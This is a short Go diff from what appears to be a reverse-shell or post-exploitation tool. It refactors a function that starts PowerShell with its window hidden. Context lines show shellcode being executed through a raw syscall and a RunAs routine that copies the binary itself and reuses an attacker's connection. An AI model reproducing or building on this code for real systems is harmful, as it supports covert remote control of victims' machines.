@@ -28,10 +28,10 @@ func Shell() *exec.Cmd {
 }
 
 // Powershell ...
-func Powershell() *exec.Cmd {
+func Powershell() (*exec.Cmd, error) {
 	cmd := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	return cmd
+	return cmd, nil
 }
 
 // ExecShell ...
@@ -130,7 +130,7 @@ func ExecSC(sc []byte) {
 	syscall.Syscall(addr, 0, 0, 0, 0)
 }
 
-// RunAs will rerun the xs as the user we specify
+// RunAs will rerun the as as the user we specify
 func RunAs(user string, pass string, domain string, c net.Conn) {
 	path := CopySelf()
 	ip, port := utils.SplitAddress(c.RemoteAddr().String())
